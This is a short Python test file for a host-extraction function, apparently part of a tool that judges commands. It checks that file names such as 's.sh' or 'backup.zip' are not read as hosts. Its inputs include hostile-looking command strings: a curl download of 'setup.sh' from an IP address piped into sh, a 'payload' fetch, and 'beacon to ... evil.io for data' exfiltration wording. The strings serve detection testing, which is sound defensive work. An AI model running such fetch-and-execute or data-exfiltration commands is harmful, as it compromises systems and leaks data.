"""Item 7: host/TLD extraction robustness. A local file whose extension is also a gTLD must not be
read as a host; genuine bare hosts and URL hosts still are."""

from alibi.judge import extract_targets


def _hosts(t):
    return {x.value for x in extract_targets(t) if x.kind.value == "host"}


def test_local_file_with_tld_ext_not_a_host():
    h = _hosts("curl -s http://198.51.100.7/setup.sh -o s.sh & sh s.sh")
    assert "s.sh" not in h and "198.51.100.7" in h


def test_zip_and_app_files_not_hosts():
    assert "backup.zip" not in _hosts("tar -czf archive then upload backup.zip")
    assert "my.app" not in _hosts("open My.app now")


def test_real_bare_hosts_still_extracted():
    h = _hosts("beacon to telemetry-collect.dev and evil.io for data")
    assert "telemetry-collect.dev" in h and "evil.io" in h


def test_url_host_with_sh_tld_still_extracted():
    assert "real.sh" in _hosts("curl http://real.sh/payload")
